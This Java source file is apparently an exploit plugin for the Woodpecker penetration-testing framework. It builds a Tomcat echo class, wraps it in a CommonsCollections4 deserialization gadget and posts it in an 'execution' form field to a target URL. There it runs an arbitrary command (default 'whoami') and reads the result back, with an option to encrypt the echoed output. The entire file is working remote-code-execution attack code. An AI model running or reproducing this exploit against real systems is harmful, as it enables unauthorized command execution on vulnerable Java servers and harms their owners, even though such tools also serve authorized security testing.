package me.gv7.woodpecker.vuldb.execution.deserial;

import me.gv7.jevilcode.config.AbstractConfig;
import me.gv7.jevilcode.jEvilCodeApi;
import me.gv7.jevilcode.utils.CryptUtil;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.codec.BASE64Encoder;
import me.gv7.woodpecker.tools.misc.RandomUtil;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class EchoExecuteCommandExploit implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "execute comand";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder binder = VulPluginImpl.callbacks.getPluginHelper().createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        final IArg gadget = VulPluginImpl.callbacks.getPluginHelper().createArg();
        gadget.setName("command");
        gadget.setDefaultValue("whoami");
        gadget.setRequired(true);
        gadget.setDescription("要执行的命令");
        args.add(gadget);

        final IArg encryptArg = VulPluginImpl.callbacks.getPluginHelper().createArg();
        encryptArg.setName("encrypt");
        encryptArg.setDefaultValue("true");
        encryptArg.setRequired(true);
        encryptArg.setDescription("是否加密");
        args.add(encryptArg);
        binder.setArgsList(args);
        return binder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String vulURL = target.getAddress();
        String command = (String)customArgs.get("command");
        boolean encrypt = Boolean.valueOf((String)customArgs.get("encrypt"));

        byte[] clazzBytes = null;
        AbstractConfig config = new AbstractConfig();
        String respHeaderKey = RandomUtil.getRandomString(12);
        String respHeaderValue = RandomUtil.getRandomString(12);

        if(encrypt){
            CommonUtil.basicCheckVuln(vulURL, resultOutput);
            // 动态生成回显加密key
            String cryptKey = RandomUtil.getRandomString(8);

            config.setCodeBrokeName("TomcatEncryptEchoExec1");
            config.setCodebrokeArgs(String.format("%s|%s|%s|%s",cryptKey,command,respHeaderKey,respHeaderValue));
            config.setOUTPUT_FORMAT(AbstractConfig.OF_CLASS);
            config.setExtendsTransletType(AbstractConfig.ET_JDK);
            jEvilCodeApi evilCodeApi = new jEvilCodeApi(config);
            clazzBytes = evilCodeApi.generate();


            String ysoCmd = String.format("class_base64:%s",new BASE64Encoder().encode(clazzBytes));
            String payload = CommonUtil.generate("CommonsCollections4", ysoCmd);

            Map<String,String> requestBody = new HashMap<>();
            requestBody.put("execution", payload);
            RawResponse response = Requests.post(vulURL).body(requestBody).send();
            resultOutput.infoPrintln("Send payload finish");
            String respHeader = response.getHeader(respHeaderKey);
            if(respHeader != null && respHeader.equals(respHeaderValue)){
                String respBody = response.readToText();
                String execRes = CryptUtil.decrypt(respBody,cryptKey);
                resultOutput.successPrintln("回显执行命令结果:\n");
                resultOutput.rawPrintln(execRes);
            }else{
                resultOutput.failPrintln("回显执行命令失败");
                resultOutput.debugPrintln("\n" + response.readToText() + "\n");
            }
        }else{
            String reqCmdHeader = RandomUtil.getRandomString(8);

            config.setCodeBrokeName("TomcatEchoExec1");
            config.setCodebrokeArgs(String.format("%s|%s|%s",reqCmdHeader,respHeaderKey,respHeaderValue));
            config.setOUTPUT_FORMAT(AbstractConfig.OF_CLASS);
            config.setExtendsTransletType(AbstractConfig.ET_JDK);
            jEvilCodeApi evilCodeApi = new jEvilCodeApi(config);
            clazzBytes = evilCodeApi.generate();

            String ysoCmd = String.format("class_base64:%s",new BASE64Encoder().encode(clazzBytes));
            String payload = CommonUtil.generate("CommonsCollections4", ysoCmd);

            Map<String,String> requestHeader = new HashMap<>();
            requestHeader.put(reqCmdHeader,command);
            Map<String,String> requestBody = new HashMap<>();
            requestBody.put("execution", payload);
            RawResponse response = Requests.post(vulURL).headers(requestHeader).body(requestBody).send();
            resultOutput.infoPrintln("Send payload finish");
            String respHeader = response.getHeader(respHeaderKey);
            if(respHeader != null && respHeader.equals(respHeaderValue)){
                String respBody = response.readToText();
                resultOutput.successPrintln("回显执行命令结果:\n");
                resultOutput.rawPrintln(respBody);
            }else{
                resultOutput.failPrintln("回显执行命令失败");
                resultOutput.debugPrintln("\n" + response.readToText() + "\n");
            }
        }
    }
}
